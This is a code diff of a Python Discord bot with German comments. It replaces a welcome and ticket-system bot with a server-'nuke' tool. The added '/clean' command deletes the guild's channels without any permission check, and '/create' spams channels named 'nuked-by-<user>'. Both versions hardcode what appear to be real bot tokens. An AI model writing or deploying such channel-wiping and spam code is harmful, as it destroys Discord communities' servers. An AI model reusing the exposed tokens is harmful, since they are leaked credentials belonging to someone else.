@@ -1,36 +1,37 @@
 import discord
 from discord.ext import commands
-import logging
-from welcome import send_welcome_message  # Importiere Welcome-Funktion
-from ticket import setup_ticket_system  # Importiere das Ticket-System
 
-# Logging konfigurieren
-logging.basicConfig(level=logging.INFO)
-
-# Bot-Einstellungen
 intents = discord.Intents.default()
-intents.message_content = True  # Damit der Bot Nachrichten lesen kann
-intents.members = True  # Damit der Bot Mitglieder-Events sehen kann
+intents.guilds = True
+intents.guild_messages = True
 
-# Bot initialisieren
-bot = commands.Bot(command_prefix="!", intents=intents)
+bot = commands.Bot(command_prefix="/", intents=intents)
 
-# Event: Bot ist bereit
 @bot.event
 async def on_ready():
-    logging.info(f'✅ {bot.user} ist online!')
-    logging.info("Bot ist bereit, überprüfe Guilds...")
-    logging.info(f"Guilds gefunden: {len(bot.guilds)}")
+    print(f"Bot {bot.user.name} ist bereit!")
 
-    # Lade das Ticket-System
-    logging.info("🟡 Ticket-System wird eingerichtet...")
-    await setup_ticket_system(bot)
-    logging.info("✅ Ticket-System erfolgreich eingerichtet.")
+@bot.command()
+async def clean(ctx, count: int):
+    channels = ctx.guild.channels
+    deleted_channels = 0
+    for channel in channels:
+        if deleted_channels >= count:
+            break
+        try:
+            await channel.delete()
+            deleted_channels += 1
+        except Exception as e:
+            print(f"Fehler beim Löschen: {e}")
+    await ctx.send(f"{deleted_channels} Kanäle wurden gelöscht.")
 
-# Event: Welcome Nachricht senden
-@bot.event
-async def on_member_join(member):
-    await send_welcome_message(member)
+@bot.command()
+async def create(ctx):
+    for i in range(20):
+        try:
+            await ctx.guild.create_text_channel(f"nuked-by-{ctx.author.name}")
+        except Exception as e:
+            print(f"Fehler beim Erstellen: {e}")
+    await ctx.send("20 Kanäle wurden erfolgreich erstellt!")
 
-# Starte den Bot mit deinem Token
-bot.run("MTM0OTA3MTY5NjYzNTc2MDc2MA.GFsZy1.vlVZuBM9hfSlVlS1oUety9Oxn-LzIV_zImnnlE")  # Ersetze durch deinen echten Token
+bot.run("MTM0OTA3MTY5NjYzNTc2MDc2MA.Gkju_y.C2_HJlPKi-AdiFu7nYk42T91IsWKxvLGSDjadM")
